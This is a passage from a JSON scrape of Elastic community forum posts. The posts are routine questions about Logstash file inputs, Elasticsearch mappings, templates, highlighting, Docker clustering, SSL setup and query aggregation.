    "date": "April 6, 2020, 5:23pm April 6, 2020, 5:28pm April 6, 2020, 7:19pm",
    "body": "I have a following configuration. when I run this from command line it works and reads file but when I run it via pipleline it never reads this file. pipeline shows it is running Am I missing something here ? I am generating file hourly and putting it here. every time it is new file name. that way it has no same inode either and different name xyz_hourly.csv_01 xyz_hourly.csv_02 xyz_hourly.csv_03 input { file { path => \"/csv_files/*_hourly.csv*\" start_position => \"beginning\" mode => \"read\" sincedb_path => \"/dev/null\" codec => plain { charset => \"Windows-1252\" } } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8372f4eb-9f23-4637-ace1-177fd8cba6a6",
    "url": "https://discuss.elastic.co/t/mapping-issue-in-index-setting-up-manual-mapping/226485",
    "title": "Mapping Issue in Index setting up manual mapping",
    "category": [
      "Logstash"
    ],
    "author": "Sergioc",
    "date": "April 3, 2020, 10:56pm April 6, 2020, 7:17pm April 6, 2020, 7:18pm",
    "body": "Hello, hope everybody is safe... I have a logstash pipeline that sends data from a SQL database to elastic. I have never configured mappings , I was letting elastic to set up the mapping for me. but I have a field that is for Temperature that elastic was mapping the field as a long and in datatables I was missing the decimal points. I was reading that I need to change the field to float. So I create a new index, I have manually added a mapping for the fields, including the temperature as a float but when I'm sending the data from logstash I'm receiving this error. Rejecting mapping update to [coronavirus] as the final mapping would have more than 1 type I don't know what else to do. Thank you in advance. Yes, my index name is Coronavirus, it is from a screening tool that we have created in our company to save data of all persons visiting the building. and I have a small dashboard to show that data but the temperature was showing as Int in the tables.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fe86a4fa-e786-4d2f-a146-366f7db1a1ce",
    "url": "https://discuss.elastic.co/t/multiple-pipelines-running-on-same-machine/225217",
    "title": "Multiple pipelines running on same machine",
    "category": [
      "Logstash"
    ],
    "author": "adityaPsl",
    "date": "March 26, 2020, 2:45pm March 26, 2020, 5:39pm March 26, 2020, 6:09pm March 26, 2020, 6:39pm March 27, 2020, 3:24am April 6, 2020, 11:57am April 6, 2020, 2:10pm April 6, 2020, 2:32pm April 6, 2020, 4:11pm April 6, 2020, 6:09pm",
    "body": "Hello Team, I am facing issues with logstash pipelines filter section i am using multiple filters like grok, elasticsearch translate, ruby etc in combination, The issue is the data of some other record processed at the around the same time overwrites the field values and sometimes adds exception in tags but when the records processed individually filter section works fine with no exceptions and data overwritten. does multiple pipelines use the same JVM, are ruby variables shared between two events. are there any tools recommended to debug the issue. ELK Version : 7.4.2 Thank you, Aditya",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "8f4aa00e-99d6-418c-92e0-bb92be97f688",
    "url": "https://discuss.elastic.co/t/about-the-elasticsearch-category/21",
    "title": "About the Elasticsearch category",
    "category": [
      "Elasticsearch"
    ],
    "author": "dadoonet",
    "date": "May 9, 2019, 8:49am",
    "body": "Any questions related to Elasticsearch, including specific features, language clients and plugins. READ THIS SECTION IF IT'S YOUR FIRST POST Some useful links: elasticsearch reference guide elasticsearch user guide elasticsearch plugins elasticsearch clients other documentation If you have any trouble, please tell us as many information as possible like your technical environment, sizing, architecture, nodes... Providing a script to reproduce locally is definitely helping a lot to get quicker and more accurate responses. Please format your code using </> icon and produce full scripts like this one: DELETE index PUT index/_doc/1 { \"foo\": \"bar\" } GET index/_search { \"query\": { \"match\": { \"foo\": \"bar\" } } } A typical script like this one can be copied and pasted in Kibana Dev Console by any reader. It will definitely help to play with your example and provide a fix for your script. If you don't provide it, there is a chance that nobody can help. This is the icon to use if you are not using markdown format: image.jpg764×92 16.4 KB Also be patient when waiting for an answer to your questions. This is a community forum and as such it may take some time before someone replies to your question. Not everyone on the forum is an expert in every area so you may need to wait for someone who knows about the area you are asking about to come online and have the time to look into your problem. Please see the code of conduct for more details on our code of conduct (in particular the \"be patient\" section). There are no SLAs on responses to questions posted on this forum, if you require help with an SLA on responses you should look into purchasing a subscription package that includes support with an SLA such as those offered by Elastic.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "00633da4-e7c1-49f7-b7c8-f9246a4f0262",
    "url": "https://discuss.elastic.co/t/unable-to-create-client-connect-ssl-certificate-verify-failed/229352",
    "title": "Unable to create client connect; SSL certificate verify failed",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 9:08pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "59bcc6f3-f306-4f14-b6b2-11fadce82864",
    "url": "https://discuss.elastic.co/t/how-to-retrieve-index-template-version-number-using-high-level-rest-api/226473",
    "title": "How to retrieve index template version number using High Level REST API",
    "category": [
      "Elasticsearch"
    ],
    "author": "Cat",
    "date": "April 3, 2020, 8:04pm April 20, 2020, 5:29pm April 22, 2020, 8:50pm",
    "body": "I am new to elasticsearch. I am looking for example how to retrieve index template version using HLRest API. I saw some posts indicating that this is not possible?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d9963f79-b7d1-4f21-8220-a01f5dee6f8f",
    "url": "https://discuss.elastic.co/t/how-is-a-template-used-while-creating-an-index-with-java-api/229339",
    "title": "How is a template used while creating an index with Java API",
    "category": [
      "Elasticsearch"
    ],
    "author": "angryninja",
    "date": "April 22, 2020, 6:47pm April 22, 2020, 8:26pm April 22, 2020, 8:29pm April 22, 2020, 8:32pm April 22, 2020, 8:36pm April 22, 2020, 8:40pm",
    "body": "Hi, I'm trying to create an index which is going to have a common structure every time it'll be recreated. I've created a template on ES and want to use it while creating and populating the index via Java program. How can an index template be used while creating an index from Java API. Index template PUT _template/quick-search { \"index_patterns\": [\"quick-search*\"], \"settings\": { \"number_of_shards\": 1 }, \"mappings\": { \"_source\": { \"enabled\": false }, \"properties\": { \"item\" : { \"type\" : \"long\" }, \"description\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } }, \"id\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } } } } } `",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "5194682e-d270-4e82-a1ee-99ffec8882f6",
    "url": "https://discuss.elastic.co/t/ilm-document-count-inconsistent-rollover/229340",
    "title": "Ilm document count inconsistent rollover",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 7:08pm April 22, 2020, 7:43pm April 22, 2020, 8:08pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "adea0ade-72dc-4619-9bdd-738c3521ba9b",
    "url": "https://discuss.elastic.co/t/no-highlighting-with-intervals-fuzzy-queries/229259",
    "title": "No highlighting with intervals/fuzzy queries",
    "category": [
      "Elasticsearch"
    ],
    "author": "val",
    "date": "April 22, 2020, 12:41pm April 22, 2020, 3:01pm April 22, 2020, 3:19pm April 22, 2020, 8:06pm",
    "body": "In a recent feature request, the intervals query was extended to support fuzzy rules. I'm now trying to figure out why highlighting doesn't work with intervals/fuzzy whereas it does work with intervals/match and span_near/fuzzy. Let's index a sample document: POST test-index/_doc/1 { \"text\": \"The quick brown fox jumps over the lazy dog\" } Using the span_near/fuzzy query, it works: POST test-index/_search { \"highlight\": { \"number_of_fragments\": 1, \"fragment_size\": 100, \"fields\": { \"text\": { \"type\": \"unified\" } } }, \"query\": { \"span_near\": { \"clauses\": [ { \"span_multi\": { \"match\": { \"fuzzy\": { \"text\": { \"fuzziness\": \"AUTO\", \"value\": \"quick\" } } } } }, { \"span_multi\": { \"match\": { \"fuzzy\": { \"text\": { \"fuzziness\": \"AUTO\", \"value\": \"lazy\" } } } } } ], \"slop\": 5, \"in_order\": false } } } Response: \"hits\" : [ { \"_index\" : \"test-index\", \"_type\" : \"_doc\", \"_id\" : \"1\", \"_score\" : 0.119415164, \"_source\" : { \"text\" : \"The quick brown fox jumps over the lazy dog\" }, \"highlight\" : { \"text\" : [ \"The <em>quick</em> brown fox jumps over the <em>lazy</em> dog\" ] } } ] Using the intervals/match query, it also works: POST test-index/_search { \"highlight\": { \"number_of_fragments\": 1, \"fragment_size\": 100, \"fields\": { \"text\": { \"type\": \"unified\" } } }, \"query\": { \"intervals\": { \"text\": { \"all_of\": { \"ordered\": false, \"max_gaps\": 5, \"intervals\": [ { \"match\": { \"query\": \"quick\" } }, { \"match\": { \"query\": \"lazy\" } } ] } } } } } Response: \"hits\" : [ { \"_index\" : \"test-index\", \"_type\" : \"_doc\", \"_id\" : \"1\", \"_score\" : 0.14285713, \"_source\" : { \"text\" : \"The quick brown fox jumps over the lazy dog\" }, \"highlight\" : { \"text\" : [ \"The <em>quick</em> brown fox jumps over the <em>lazy</em> dog\" ] } } ] Finally, we the intervals/fuzzy query, it doesn't work (i.e. no highlight section in the response): POST test-index/_search { \"highlight\": { \"number_of_fragments\": 1, \"fragment_size\": 100, \"fields\": { \"text\": { \"type\": \"unified\" } } }, \"query\": { \"intervals\": { \"text\": { \"all_of\": { \"ordered\": false, \"max_gaps\": 5, \"intervals\": [ { \"fuzzy\": { \"term\": \"quick\" } }, { \"fuzzy\": { \"term\": \"lazy\" } } ] } } } } } Response: \"hits\" : [ { \"_index\" : \"test-index\", \"_type\" : \"_doc\", \"_id\" : \"1\", \"_score\" : 0.14285713, \"_source\" : { \"text\" : \"The quick brown fox jumps over the lazy dog\" } } ] Would anyone have any idea why? @jimczi maybe? Thank you so much!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "200f50c1-600c-46c4-898e-3c6ffed02fad",
    "url": "https://discuss.elastic.co/t/multi-node-cluster-with-docker-compose-please-help/229345",
    "title": "Multi node cluster with docker compose - please help",
    "category": [
      "Elasticsearch"
    ],
    "author": "Venkatesh_Murthy",
    "date": "April 22, 2020, 7:36pm",
    "body": "i followed word by word instructions of this link.. https://www.elastic.co/guide/en/elasticsearch/reference/current/docker.html but my es02 container wont start .. it says failed to resolve host [es01] as follows: es02 | \"at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]\", es02 | \"at java.lang.Thread.run(Thread.java:830) [?:?]\"] } es02 | {\"type\": \"server\", \"timestamp\": \"2020-04-22T19:28:21,859Z\", \"level\": \"WARN\", \"component\": \"o.e.d.SeedHostsResolver\", \"cluster.name\": \"es-docker-cluster\", \"node.name\": \"es02\", \"message\": \"failed to resolve host [es01]\", es02 | \"stacktrace\": [\"java.net.UnknownHostException: es01\", es02 | \"at java.net.InetAddress$CachedAddresses.get(InetAddress.java:798) ~[?:?]\", es02 | \"at java.net.InetAddress.getAllByName0(InetAddress.java:1489) ~[?:?]\", es02 | \"at java.net.InetAddress.getAllByName(InetAddress.java:1348) ~[?:?]\", es02 | \"at java.net.InetAddress.getAllByName(InetAddress.java:1282) ~[?:?]\", es02 | \"at org.elasticsearch.transport.TcpTransport.parse(TcpTransport.java:528) ~[elasticsearch-7.6.2.jar:7.6.2]\", es02 | \"at org.elasticsearch.transport.TcpTransport.addressesFromString(TcpTransport.java:470) ~[elasticsearch-7.6.2.jar:7.6.2]\", es02 | \"at org.elasticsearch.transport.TransportService.addressesFromString(TransportService.java:813) ~[elasticsearch-7.6.2.jar:7.6.2]\", es02 | \"at org.elasticsearch.discovery.SeedHostsResolver.lambda$resolveHostsLists$0(SeedHostsResolver.java:144) ~[elasticsearch-7.6.2.jar:7.6.2]\", es02 | \"at java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[?:?]\", es02 | \"at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:633) ~[elasticsearch-7.6.2.jar:7.6.2]\", es02 | \"at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]\", es02 | \"at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]\", es02 | \"at java.lang.Thread.run(Thread.java:830) [?:?]\"] } Gracefully stopping... (press Ctrl+C again to force) Stopping es03 ... done Stopping es02 ... done D:\\kibanadocker> D:\\kibanadocker> please help what should be correcting here?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5630b872-c745-4706-bc83-1e88a746d3f4",
    "url": "https://discuss.elastic.co/t/need-help-optimizing-index-with-450mio-entries/228879",
    "title": "Need help optimizing index with 450mio entries",
    "category": [
      "Elasticsearch"
    ],
    "author": "sulo",
    "date": "April 20, 2020, 2:06pm April 20, 2020, 5:05pm April 20, 2020, 6:32pm April 20, 2020, 7:45pm April 20, 2020, 8:14pm April 20, 2020, 8:24pm April 20, 2020, 9:45pm April 21, 2020, 7:55pm April 22, 2020, 4:55am April 22, 2020, 7:27pm",
    "body": "Hi everybody, I have currently massive problems with my elasticsearch setup. I store aggregated google analytics data in elastic search for further processing. There are currently around 450mio documents in this index. The problem I have that the aggregate queries that I need to perform on the index sometimes take longer than 60sec which results in a \"Gateway Timeout\". But the much bigger problem is that the spark-jobs that I use to add data once a day as a batch started failing on me because it seems that the index can't keep up inserting documents. This basically makes the data inconsistent and of not that much worth. When I started I didn't configure much as shown below. But after the first problems occurred I started researching indexes and shards and so on... also I read that it is a good idea to split the index in monthly indexes. So that was my next and current try. But that performs even worse for lookup. Haven't tested it for writing tho. Since the amount of data is quite large and copying data from one index to another takes quite some time. There are not that many shots that I can take. That's why some help would really be appreciated. I started with a very basic index without much configuration: { \"kpi_dashboard\" : { \"aliases\" : { }, \"mappings\" : { \"properties\" : { \"date\" : { \"type\" : \"date\" }, \"fullVisitorId\" : { \"type\" : \"keyword\", \"eager_global_ordinals\" : true }, \"page_hostname\" : { \"type\" : \"keyword\" }, \"portfolio\" : { \"type\" : \"keyword\", \"eager_global_ordinals\" : true }, \"session_id\" : { \"type\" : \"keyword\" }, \"time_on_host\" : { \"type\" : \"long\" }, \"visitId\" : { \"type\" : \"keyword\" } } }, \"settings\" : { \"index\" : { \"creation_date\" : \"1583354059301\", \"number_of_shards\" : \"5\", \"number_of_replicas\" : \"1\", \"uuid\" : \"XSHICZ1gQICzHfbSmBKajA\", \"version\" : { \"created\" : \"7010199\" }, \"provided_name\" : \"kpi_dashboard\" } } } } Then used a monthswise index like this: { \"kpi-dashboard-traffic-2019-01-00001\" : { \"aliases\" : { \"kpi-dashboard-traffic-read\" : { } }, \"mappings\" : { \"properties\" : { \"date\" : { \"type\" : \"date\" }, \"fullVisitorId\" : { \"type\" : \"keyword\", \"eager_global_ordinals\" : true }, \"page_hostname\" : { \"type\" : \"keyword\" }, \"portfolio\" : { \"type\" : \"keyword\", \"eager_global_ordinals\" : true }, \"session_id\" : { \"type\" : \"keyword\", \"eager_global_ordinals\" : true }, \"time_on_host\" : { \"type\" : \"long\" }, \"visitId\" : { \"type\" : \"keyword\" } } }, \"settings\" : { \"index\" : { \"number_of_shards\" : \"1\", \"provided_name\" : \"kpi-dashboard-traffic-2019-01-00001\", \"creation_date\" : \"1583998849339\", \"sort\" : { \"field\" : [ \"date\", \"portfolio\", \"session_id\" ], \"order\" : [ \"desc\", \"desc\", \"desc\" ] }, \"number_of_replicas\" : \"1\", \"uuid\" : \"T1ZMx5DHSEie8y7qC_OlgA\", \"version\" : { \"created\" : \"7010199\" } } } } } The Elasticsearch Cluster is currently running on AWS with 1 master and 1 data node in each of 3 availability zones. (so 6 servers) masters are r5.large datanodes are r5.2xlarge Thank you very much.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "472b6525-814f-44a0-b0a0-0d12dc08682e",
    "url": "https://discuss.elastic.co/t/min-doc-count-combined-with-order-by-average/229245",
    "title": "Min_doc_count combined with order by average",
    "category": [
      "Elasticsearch"
    ],
    "author": "Christian_Hansen_Jam",
    "date": "April 22, 2020, 6:38pm",
    "body": "As the topic says, Im having problem sorting data when combining with min_doc_count with an average value. The data om working with is logfiles from a webserver. Two of the field are url.path and event.duration. My goal is to identify the slow endpoints. This is fairly easy and solved that problem with the following query. \"aggs\" : { \"endpoints\" : { \"terms\" : { \"field\" : \"url.path\", \"size\" : 20, \"order\": { \"average_responsetime\": \"desc\" } }, \"aggs\": { \"average_responsetime\": { \"avg\": { \"field\": \"event.duration\" } } } } } When looking a the data i realized that the top results were bucket sizes of one or two. This makes sence, since they are not cached and thus has a long response time and are not really that interesting. To get rid of these small buckets i found the min_doc_count and turned it up to 100. \"aggs\" : { \"endpoints\" : { \"terms\" : { \"field\" : \"url.path\", \"size\" : 20, \"min_doc_count\": 10, \"order\": { \"average_responsetime\": \"desc\" } }, \"aggs\": { \"average_responsetime\": { \"avg\": { \"field\": \"event.duration\" } } } } } But this does not work. The only way to get min_doc_count working is by removing \"order\": { \"average_responsetime\": \"desc\" } but then I dont get the documents im interested in. Any ideas on how i can get this to work ?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5c9e34f6-4007-4d3a-a4b2-08c3372d39c4",
    "url": "https://discuss.elastic.co/t/nested-nosuchfileexception-usr-share-elasticsearch-config-certificates-ca-ca-crt/229337",
    "title": "Nested: NoSuchFileException[/usr/share/elasticsearch/config/certificates/ca/ca.crt]",
    "category": [
      "Elasticsearch"
    ],
    "author": "Teed",
    "date": "April 22, 2020, 6:33pm",
    "body": "ElasticsearchSecurityException[failed to load SSL configuration [xpack.security.http.ssl]]; nested: ElasticsearchException[failed to initialize SSL TrustManager - certificate_authorities file [/usr/share/elasticsearch/config/certificates/ca/ca.crt] does not exist]; nested: NoSuchFileException[/usr/share/elasticsearch/config/certificates/ca/ca.crt]; elasticsearch2 | Likely root cause: java.nio.file.NoSuchFileException: /usr/share/elasticsearch/config/certificates/ca/ca.crt elasticsearch2 | at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) elasticsearch2 | at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) elasticsearch2 | at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) elasticsearch2 | at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219) elasticsearch2 | at java.base/java.nio.file.Files.newByteChannel(Files.java:374) elasticsearch2 | at java.base/java.nio.file.Files.newByteChannel(Files.java:425) elasticsearch2 | at java.base/java.nio.file.spi.FileSystemProvider.newInputStream(FileSystemProvider.java:420) elasticsearch2 | at java.base/java.nio.file.Files.newInputStream(Files.java:159) elasticsearch2 | at org.elasticsearch.xpack.core.ssl.CertParsingUtils.readCertificates(CertParsingUtils.java:97) elasticsearch2 | at org.elasticsearch.xpack.core.ssl.CertParsingUtils.readCertificates(CertParsingUtils.java:90) elasticsearch2 | at org.elasticsearch.xpack.core.ssl.PEMTrustConfig.createTrustManager(PEMTrust I have it in docker-compose, volumes: - '/var/lib/pgsql/docker/elasticsearch/data:/usr/share/elasticsearch/data' - certs:$CERTS_DIR",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "51914258-e5d2-4006-9a20-064c52e4d933",
    "url": "https://discuss.elastic.co/t/uploading-scooter-data-to-kibana-analyzing-geo-data-later-on/229332",
    "title": "Uploading scooter data to Kibana (analyzing geo data later on)",
    "category": [
      "Elasticsearch"
    ],
    "author": "Infinity7",
    "date": "April 22, 2020, 6:25pm",
    "body": "Hello guys, I am very new to Kibana and would like to analyze scooter data to learn about: distance travelled per scooter, e.g. per day number of rides per scooter, e.g. per day position of the scooters (e.g. in a heatmap) battery status (e.g. average, day curve) (...) My first question is how I get the data into Kibana to be able to analyze it in regards to the aim above. As an input I have .json files that look like the following. It shows for every scooter (id) the current battery level and location. I have this kind of file for every 2 minutes. `[ { \"id\": \"9408a9a2-e421-4eff-b9ff-c173297b3580\", \"state\": \"ACTIVE\", \"lastLocationUpdate\": \"2020-04-19T15:33:24Z\", \"lastStateChange\": \"2020-04-14T09:25:19Z\", \"batteryLevel\": 31, \"lat\": 57.713175, \"lng\": 11.979854, \"maxSpeed\": 20, \"zoneId\": \"GOTHENBURG\", \"licencePlate\": \"233232\", \"vin\": \"AC233232\", \"code\": 233232, \"isRentable\": true, \"iotVendor\": \"okai\" }, { \"id\": \"9c27eb36-b5ce-47ef-a420-03bcfa255b71\", \"state\": \"ACTIVE\", \"lastLocationUpdate\": \"2020-04-19T15:32:25Z\", \"lastStateChange\": \"2020-04-16T11:30:40Z\", \"batteryLevel\": 79, \"lat\": 51.932435, \"lng\": 7.613829, \"maxSpeed\": 20, \"zoneId\": \"MUENSTER\", \"licencePlate\": \"269WSA\", \"vin\": \"AC225888\", \"code\": 225888, \"isRentable\": true, \"iotVendor\": \"okai\" },` What I've done so far: (might be completely wrong way) After completing the Kibana tutorial I tried to upload the files to elastic.. as an index(?). That did not work so I rearanged the files using python and created a .json file for every combination of timestamp and id: {\"@timestamp\": \"2020-04-19T17:40:00Z\", \"id\": \"0a18b4cc-6a74-4868-b12e-e1a9be6ff955\", \"battery\": 41, \"geo\": {\"coordinates\": {\"lat\": 52.366745, \"lon\": 9.696898}}} Uploading to elastic worked then but not the steps I tried after that. I thought that I probably need a mapping like in the tutorial so I did that first: `PUT /tier_sample_2020_04_19_new { \"mappings\": { \"properties\": { \"battery\": {\"type\": \"integer\"}, \"geo\": { \"properties\": { \"coordinates\": { \"type\": \"geo_point\" } } } } } }` But when I now try to upload the files it gives me an error: image962×35 2.53 KB For the upload I am using python aswell: `res = requests.get('http://localhost:9200') print (res.content) es = Elasticsearch([{'host': 'localhost', 'port': '9200'}]) i = 0 for filename in os.listdir(directory): if filename.endswith(\".json\"): f = open(filename) docket_content = f.read() # Send the data into es es.index(index='tier_sample_2020_04_19_new', doc_type='docket', id=i, body=json.loads(docket_content)) i = i + 1` I hope someone can help me. For me as a non computer science student this is all very new to me... Rough hints which videos etc. I should check out are also appreciated!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "523447e5-96ce-4559-9538-3a8856009c6f",
    "url": "https://discuss.elastic.co/t/any-suggestions-on-creating-watches-for-derivative-values/229133",
    "title": "Any suggestions on creating watches for derivative values?",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 11:31am April 22, 2020, 11:34am April 22, 2020, 3:33pm April 22, 2020, 5:28pm April 22, 2020, 6:06pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "00670344-caf4-45a6-b845-16f1a6aa4a27",
    "url": "https://discuss.elastic.co/t/elasticsearch-cluster-error-for-es-7-2-1-master-not-discovered-yet/229311",
    "title": "Elasticsearch cluster error for ES 7.2.1 \"master not discovered yet:\"",
    "category": [
      "Elasticsearch"
    ],
    "author": "mkbmanas87",
    "date": "April 22, 2020, 6:04pm",
    "body": "Hi Team, I am getting the below Warning in 1 of my data node. My configuration is 1 master and 1 data node but data node is not connecting with the master node. ES Version- 7.2.1 \"Error:- [o.e.c.c.ClusterFormationFailureHelper] [elastic-worker] master not discovered yet: have discovered []; discovery will continue using [x.x.x.25:9300] from hosts providers and [{elastic-worker}{vY2-JKGMQnCiO7xxosmvrw}{yDzLPkZqTmKqixDUz6s5_A}{localhost}{127.0.0.1:9300}{ml.machine_memory=33736433664, xpack.installed=true, ml.max_open_jobs=20}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\"",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "17f0ca8a-c753-44e5-bec0-f16fd315efe8",
    "url": "https://discuss.elastic.co/t/only-few-hit-content-files-are-showing-the-correct-results-custom-analyzer/229330",
    "title": "Only few hit content files are showing the correct results - custom analyzer",
    "category": [
      "Elasticsearch"
    ],
    "author": "Lisahtwy",
    "date": "April 22, 2020, 6:06pm",
    "body": "Hi, I have created a custom analyzer to recognize special characters in my files such as @,-, /, etc Here is my custom analyzer when i am creating the index: PUT /s3/ { \"settings\": { \"index\": { \"number_of_shards\": 1, \"number_of_replicas\": 1 }, \"analysis\": { \"analyzer\": { \"my_analyzer\": { \"type\": \"custom\", \"filter\": [ \"lowercase\" ], \"tokenizer\": \"whitespace\" } } } }, \"mappings\": { \"dynamic\": true, \"properties\": { \"file\": { \"properties\": { \"filename\": { \"type\": \"keyword\", \"store\": true } } }, \"content\": { \"type\": \"text\", \"analyzer\": \"my_analyzer\" } } } } Then I am running fsCrawler to index all files in the folder with custom analyzer. But when I the search query with regular expression as input, only few files are showing the correct highlight content, other files hit content is partial. For example: my input term = [0-9]{3}-[0-9]{2}-[0-9]{4} Python code: s = Search(using=client, index=\"s3\").query(\"regexp\", content=pattern) s = s.highlight('content') for hit in s.scan(): hit_dict = hit.to_dict() hit_dict['meta'] = hit.meta.to_dict() print('{} {} {} {}'.format(format(hit_dict['meta']['index'], hit_dict['file']['filename'], hit_dict['meta']['highlight']['content'])) In the ouput I see: s3 biopicsbcd.csv ['Avildsen\\t1\\tLane Frost\\tAthlete\\tUnknown\\t\\t0\\tMale\\tLuke Perry\\t\\tJeh-1341 <em>324-55-2633</em>25#gjw\\n\\t84 Charing Cross'] s3 beauty212bcd.csv ['sfnkjn241@outo.ogt\\n\\t7.96\\t35\\t0\\t1\\t0\\t1\\t0\\t0\\t10\\t4\\t1-2-1827 21/23/2243\\n\\t11.57\\t38\\t0\\t1\\t0\\t0\\t1\\t1\\t16\\t3\\tJeh-1341 `<em>324</em>`'] Both files have exact same SSN, but one is highlighted fully another is highlighted partially. Could you please tell me, is this because of my custom analyzer or is it a highlighter issue? -Lisa",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4c14fc48-a6be-420e-bf09-e0c52a4245d0",
    "url": "https://discuss.elastic.co/t/curl-6-could-not-resolve-host-quickstart-es-http-error/229328",
    "title": "Curl: (6) Could not resolve host: quickstart-es-http” error",
    "category": [
      "Elasticsearch"
    ],
    "author": "ubiquitousdude",
    "date": "April 22, 2020, 5:56pm",
    "body": "Hi, I'm trying to follow the article here for deploying Elastic Cloud on Kubernetes: https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html But I get an error when requesting ElasticSearch endpoint inside the Kubernetes cluster when I run this command: curl -u \"elastic:$PASSWORD\" -k \"https://quickstart-es-http:9200\" I get the error: curl: (6) Could not resolve host: quickstart-es-http” I noticed that there is no EXTERNAL-IP assigned to the quickstart-es-http service and the type is of ClusterIP. How do I fix this so I can continue with this quickstart tutorial? Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c3ccdf18-b6b3-4a39-8beb-5cdeb153d09a",
    "url": "https://discuss.elastic.co/t/filtering-data-returned-from-nested-query/229321",
    "title": "Filtering data returned from nested query",
    "category": [
      "Elasticsearch"
    ],
    "author": "Soberwolf",
    "date": "April 22, 2020, 5:03pm",
    "body": "Hello, I am have a set of data in the following structure: [ { \"productId\": \"ProductId1\", \"customerNumbers\": [ \"customer\": { \"name\": \"Prod1Cust1\", \"totalOrders\": 23 }, \"customer\": { \"name\": \"Prod2Cust1\", \"totalOrders\": 5 }, \"customer\": { \"name\": \"Prod3Cust1\", \"totalOrders\": 5 } ] }, { \"productId\": \"ProductId2\", \"customerNumbers\": [ \"customer\": { \"name\": \"Prod2Cust1\", \"totalOrders\": 23 }, \"customer\": { \"name\": \"Prod2Cust1\", \"totalOrders\": 5 } ] } ] and I need to fetch all the records which have a prefix of \"Prod1 as in name field(in the example avoid, only first record should be returned i.e. ProductId1). Also, when the data is returned, I need to just fetch just the customer number whose prefix is Prod1 i.e: Correct Output: { \"productId\": \"ProductId1\", \"customerNumbers\": [ \"customer\": { \"name\": \"Prod1Cust1\", \"totalOrders\": 23 } ] } Instead of: { \"productId\": \"ProductId1\", \"customerNumbers\": [ \"customer\": { \"name\": \"Prod1Cust1\", \"totalOrders\": 23 }, \"customer\": { \"name\": \"Prod2Cust1\", \"totalOrders\": 5 }, \"customer\": { \"name\": \"Prod3Cust1\", \"totalOrders\": 5 } ] } I'm able to fetch the records whose Name prefix is \"Prod1\" using nested query coupled with MatchPhrasePrefixQuery (this returns me result with all the customer numbers). How can I further filter the data to get customer numbers whose Name prefix is \"Prod1\". Following is my current query: { \"from\": 0, \"size\": 10, \"sort\": [ { \"name.keyword\": { \"missing\": \"_first\", \"order\": \"asc\" } } ], \"query\": { \"bool\": { \"must\": [ { \"bool\": { \"must\": [ { \"nested\": { \"query\": { \"bool\": { \"must\": [ { \"match\": { \"customerNumbers.name\": { \"query\": \"Prod1\", \"type\": \"phrase_prefix\" } } } ] } }, \"path\": \"customerNumbers\" } } ] } } ] } } } P.S: I'm using ElasticSearch 5.x with Nest.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c347ca50-1d16-4feb-bdab-aa7eaf9a2fcf",
    "url": "https://discuss.elastic.co/t/while-using-enviroment-variable-in-curator-crontab-unable-to-get-required-output/229302",
    "title": "While using enviroment variable in Curator -crontab.Unable to get required output",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 3:30pm April 22, 2020, 4:55pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "da10db17-eed5-4deb-9b23-a386ee79f0ba",
    "url": "https://discuss.elastic.co/t/search-latencies-improve-progressively-each-request-after-index-refreshes/228772",
    "title": "Search latencies improve progressively each request after index refreshes",
    "category": [
      "Elasticsearch"
    ],
    "author": "hhsuey",
    "date": "April 20, 2020, 3:17am April 20, 2020, 7:04am April 20, 2020, 9:53pm April 20, 2020, 10:22pm April 21, 2020, 1:26am April 22, 2020, 4:45pm",
    "body": "I am running a single local instance of elasticsearch. I noticed after indexing is done, when I run a few of the same exact search queries, they get progressively faster. The first one is 80ms, the second 40ms, the third 30ms, the fourth 25ms, and the fifth 25ms. Why does this happen? Is there some caching going on that progressively warms up in increments? I tried turning on/off index.store.preload for nvd/dvd, but that doesn't seem to make a difference.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "77b0a3e8-2167-4ddf-be97-a61fa8d1e77f",
    "url": "https://discuss.elastic.co/t/the-confusion-of-configuring-cluster-initial-master-nodes/229213",
